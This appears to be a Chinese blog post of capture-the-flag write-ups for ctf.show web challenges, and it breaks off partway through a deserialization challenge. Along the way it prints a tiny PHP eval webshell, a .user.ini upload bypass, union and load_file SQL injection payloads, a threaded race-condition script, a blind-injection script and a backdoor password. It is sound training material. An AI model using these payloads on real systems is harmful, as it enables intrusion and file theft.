<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">	$filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];</span><br><span class="line">	$temp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">	$size = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;];</span><br><span class="line">	$error = $_FILES[&#x27;file&#x27;][&#x27;error&#x27;];</span><br><span class="line">	$arr = pathinfo($filename);</span><br><span class="line">	$ext_suffix = $arr[&#x27;extension&#x27;];</span><br><span class="line">	if ($size &gt; 24)&#123;</span><br><span class="line">		die(&quot;error file zise&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if (strlen($filename)&gt;9)&#123;</span><br><span class="line">		die(&quot;error file name&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if(strlen($ext_suffix)&gt;3)&#123;</span><br><span class="line">		die(&quot;error suffix&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if(preg_match(&quot;/php/i&quot;,$ext_suffix))&#123;</span><br><span class="line">		die(&quot;error suffix&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/php/i&quot;),$filename))&#123;</span><br><span class="line">        die(&quot;error file name&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">	if (move_uploaded_file($temp_name, &#x27;./&#x27;.$filename))&#123;</span><br><span class="line">		echo &quot;文件上传成功！&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;文件上传失败！&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>要求文件名中没有php而且后缀名小于等于3</p>
<p>那基本所有能直接使用的php页面都传不上去了</p>
<p>而且要文件大小&lt;&#x3D;24，那就只能这么写了<code>&lt;?php eval($_POST[&#39;a&#39;]);</code></p>
<p>又不能上传.htaccess来解析绕过</p>
<blockquote>
<p>对于php中的.user.ini有如下解释：</p>
<p>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。<br>我们在.user.ini中输入<code>auto_prepend_file =a.txt</code>，这样在该目录下的所有文件都会包含a.txt的内容</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.cache-ttl">user_ini.cache_ttl</a> 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
</blockquote>
<p>所以上传之后要等一会才能重新发</p>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = intval($_GET[&#x27;c&#x27;]);</span><br><span class="line">    sleep($c);</span><br><span class="line">    switch ($c) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            echo &#x27;$url&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 555555:</span><br><span class="line">            echo $url;</span><br><span class="line">        case 44444:</span><br><span class="line">            echo &quot;@A@&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case 3333:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 222:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 222:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 3333:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 44444:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">        case 555555:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 3:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">        case 6000000:</span><br><span class="line">            echo &quot;$url&quot;;</span><br><span class="line">        case 1:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>都忘了，如果switch case不加break会一直顺序执行，所以传了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=3</span><br></pre></td></tr></table></figure>

<p>之后就会一直执行到echo “$url”;</p>
<p>进入下一个网页F12有提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/information_schema\.tables|information_schema\.columns|linestring| |polygon/is&#x27;, $_GET[&#x27;query&#x27;]))&#123;</span><br><span class="line">		die(&#x27;@A@&#x27;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>试了一下发现是int注入，直接order by查只有一列，当前数据库为web。而且ban了information_schema.tables。</p>
<blockquote>
<p>可以用`information_schema`.`tables`代替information_schema.tables</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/`information_schema`.`tables`/**/where/**/`table_schema`=&#x27;web&#x27;%23</span><br><span class="line">=&gt;alert(&#x27;content&#x27;)</span><br><span class="line"></span><br><span class="line">?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/`information_schema`.`columns`/**/where/**/`table_name`=&#x27;content&#x27;%23</span><br><span class="line">=&gt;alert(&#x27;id,username,password&#x27;)</span><br><span class="line"></span><br><span class="line">?query=-1/**/union/**/select/**/group_concat(id,&#x27;;&#x27;,username,&#x27;;&#x27;,password)/**/from/**/content%23</span><br><span class="line">=&gt;alert(&#x27;1;admin;flag is not here!,2;gtf1y;wow,you can really dance,3;Wow;tell you a secret,secret has a secret...&#x27;)</span><br></pre></td></tr></table></figure>

<p>好吧，并没有flag，那就直接试一下load_file读取本地文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/load_file(&quot;/var/www/html/secret.php&quot;)%23</span><br><span class="line">=&gt;alert(&#x27;&lt;!-- ReadMe --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;here_1s_your_f1ag.php&#x27;;</span><br><span class="line">$file = &#x27;/tmp/gtf1y&#x27;;</span><br><span class="line">if(trim(@file_get_contents($file)) === &#x27;ctf.show&#x27;)&#123;</span><br><span class="line">	echo file_get_contents(&#x27;/real_flag_is_here&#x27;);</span><br><span class="line">&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>看一下代码可以再读一下&#x2F;real_flag_is_here</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/load_file(&quot;/real_flag_is_here&quot;)%23</span><br><span class="line">=&gt;alert(&#x27;ctfshow&#123;8eb644ba-4766-41b1-a638-34e2fe5f5312&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>或者从代码里可以看出来要判断$file中是否存在”ctf.show”字符串，也可以通过into outfile函数写文件到&#x2F;tmp&#x2F;gtf1y中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/&quot;ctf.show&quot;/**/into/**/outfile(&quot;/tmp/gtf1y&quot;)%23</span><br></pre></td></tr></table></figure>

<p>然后直接访问secret.php，也能弹出flag</p>
<h2 id="红包题第六弹"><a href="#红包题第六弹" class="headerlink" title="红包题第六弹"></a>红包题第六弹</h2><p>扫目录有web.zip泄露，对页面审计发现有主要函数</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function ctfshow(token,data)&#123;</span><br><span class="line"></span><br><span class="line">			var oReq = new XMLHttpRequest();</span><br><span class="line">			oReq.open(&quot;POST&quot;, &quot;check.php?token=&quot;+token+&quot;&amp;php://input&quot;, true);</span><br><span class="line">			oReq.onload = function (oEvent) &#123;</span><br><span class="line">				if(oReq.status===200)&#123;</span><br><span class="line">						var res=eval(&quot;(&quot;+oReq.response+&quot;)&quot;);</span><br><span class="line">						if(res.success ==1 &amp;&amp;res.error!=1)&#123;</span><br><span class="line">							alert(res.msg);</span><br><span class="line">							return;</span><br><span class="line">						&#125;</span><br><span class="line">						if(res.error ==1)&#123;</span><br><span class="line">							alert(res.errormsg);</span><br><span class="line">							return;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				return;</span><br><span class="line">			&#125;;</span><br><span class="line">			oReq.send(data);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>结合web.zip中的check.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveStreamFile</span>(<span class="params"><span class="variable">$receiveFile</span></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$streamData</span> = <span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$streamData</span>))&#123;</span><br><span class="line">        <span class="variable">$streamData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$streamData</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$receiveFile</span>, <span class="variable">$streamData</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>)) === <span class="variable">$token</span>)&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$receiveFile</span> = <span class="string">&#x27;flag.dat&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">receiveStreamFile</span>(<span class="variable">$receiveFile</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">md5_file</span>(<span class="variable">$receiveFile</span>)===<span class="title function_ invoke__">md5_file</span>(<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="variable">$receiveFile</span>)!=<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;success&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;人脸识别成功!<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;same file&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;md5 error&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;token error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>

<p>随便传个东西过去发现直接报md5 error，就是md5校验那里没过，再跟踪一下receiveStreamFile函数看一下他在做什么</p>
<p>$streamData从php:&#x2F;&#x2F;input里接收数据流，然后通过file_put_contents写入到$receiveFile中</p>
<p>遇到了挺多次的小点，记录一下为什么php:&#x2F;&#x2F;input传不进去文件的问题</p>
<blockquote>
<p>php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</p>
</blockquote>
<p>而$receiveFile已经写死是flag.dat，那唯一可控的就是传输过去的数据流</p>
<p>可以直接把key.dat下下来，就可以得到目标文件的data，现在就需要想怎么把本地的key.dat传到服务器里</p>
<p>那就可以本地给个上传前端（红包题第二弹），然后在bp里稍微改一下data就能绕过md5</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309231940594.png" alt="image-20230923194044472"></p>
<p>还要把文件尾的回车删掉，这时就能弹出same file的报错。这说明md5相等而且sha512也相等</p>
<p>这个时候看了网上大部分wp，都说是md5碰撞，但其实不是的。这是<strong>条件竞争</strong></p>
<p>两个if判断中必然会有时间差，要利用这个时间差把flag.dat再次替换一遍，才可以做到绕过sha512</p>
<p>如果单纯利用fastcoll，是碰撞不出来和key.dat有相同md5的文件，这也是我看了很久想不明白的点</p>
<p>而条件竞争通常需要python的多线程操作。这里有特殊字符，bp经常会自动给你加payload导致和源文件不一致，所以使用python的thread模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://d6d06d87-f806-48a0-a282-a653e47e9fb6.challenge.ctf.show/check.php?token=70efdf2ec9b086079795c442636b55fb&amp;php://input&quot;</span><br><span class="line"></span><br><span class="line">def POST(data):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        print(r.text)</span><br><span class="line">        pass</span><br><span class="line">    except  Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        pass</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">with open(&#x27;key.dat&#x27;,&#x27;rb&#x27;) as k:</span><br><span class="line">    data = k.read()</span><br><span class="line">    pass</span><br><span class="line">for i in range(500):</span><br><span class="line">    threading.Thread(target = POST,args = (data,)).start()</span><br><span class="line">    threading.Thread(target = POST,args = (&quot;test&quot;,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309232231933.png" alt="image-20230923222239758"></p>
<h2 id="红包题第七弹"><a href="#红包题第七弹" class="headerlink" title="红包题第七弹"></a>红包题第七弹</h2><p>咋一看没东西，扫网发现有git泄露</p>
<p>用githack失败了，那就换用Git_Extract，把git扒下来，发现有backdoor.php的后门一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval($_POST[&#x27;Letmein&#x27;]);</span><br></pre></td></tr></table></figure>

<p>直接进去打，但是禁用的函数太多，没法rce。先连个蚁剑找到flag在&#x2F;var&#x2F;www下</p>
<p>可以直接用highlight_file显示出来</p>
<h2 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h2><p>唉，最低能的弱口令。得找个时间把字典好好整理一下了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u=admin&amp;p=admin888</span><br></pre></td></tr></table></figure>

<h2 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h2><p>扫网发现<a target="_blank" rel="noopener" href="http://www.zip,打开发现连了web15的数据库,函数大概是全禁了/">www.zip，打开发现连了web15的数据库，函数大概是全禁了</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?/i&quot;,$username))</span><br></pre></td></tr></table></figure>

<p>里边有个user_main.php，但是并不会直接给你放出pwd</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309241734589.png" alt="image-20230924173415512"></p>
<p>注意得到，执行的sql语句是<code>select * from user order by $order</code>，而order是可以操控的位置，当使用pwd的时候，就会使用pwd来排序。如果密码排序&gt;flag，排序就会靠上。这个时候就得考虑盲注了</p>
<p>这里给出二分法的payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">regurl = <span class="string">&quot;http://0d2d0247-36d5-4d3e-bb8f-98a64bc16ccd.challenge.ctf.show/reg.php&quot;</span></span><br><span class="line">queurl = <span class="string">&quot;http://0d2d0247-36d5-4d3e-bb8f-98a64bc16ccd.challenge.ctf.show/user_main.php?order=pwd&quot;</span></span><br><span class="line">key = <span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="comment"># 注册项目</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">    mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> mid &lt; <span class="built_in">max</span>:</span><br><span class="line">        c = key[mid]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;now playload:&quot;</span>, c)</span><br><span class="line">        raw_data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: flag + c,</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: flag + c,</span><br><span class="line">        &#125;</span><br><span class="line">        s = requests.session()</span><br><span class="line">        reg = s.post(url = regurl,</span><br><span class="line">                     data = raw_data,</span><br><span class="line">                     headers = &#123;</span><br><span class="line">                         <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=31f1f4341531ede15606ff7a99b5ec08&quot;</span></span><br><span class="line">                     &#125;)</span><br><span class="line">        que = requests.get(url = queurl, headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=31f1f4341531ede15606ff7a99b5ec08&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        p_t = que.text.index(flag + c)</span><br><span class="line">        p_flag = que.text.index(<span class="string">&quot;flag_is_my_password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> p_t &gt; p_flag:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    flag = flag + key[mid - <span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于很多&lt;&gt;等特殊符号被禁用了，所以直接指定key。而且mysql排序并不是按ascii码排序。当字母不同，按字母表顺序排列；当同字母，先小写后大写</p>
<h2 id="game-gyctf-web2"><a href="#game-gyctf-web2" class="headerlink" title="game-gyctf web2"></a>game-gyctf web2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">function safe($parm)&#123;</span><br><span class="line">    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\&#x27;,&quot;*&quot;,&quot;alter&quot;);</span><br><span class="line">    return str_replace($array,&#x27;hacker&#x27;,$parm);</span><br><span class="line">&#125;</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age=null;</span><br><span class="line">    public $nickname=null;</span><br><span class="line">    public function login() &#123;</span><br><span class="line">        if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line">        $mysqli=new dbCtrl();</span><br><span class="line">        $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);</span><br><span class="line">        if($this-&gt;id)&#123;</span><br><span class="line">        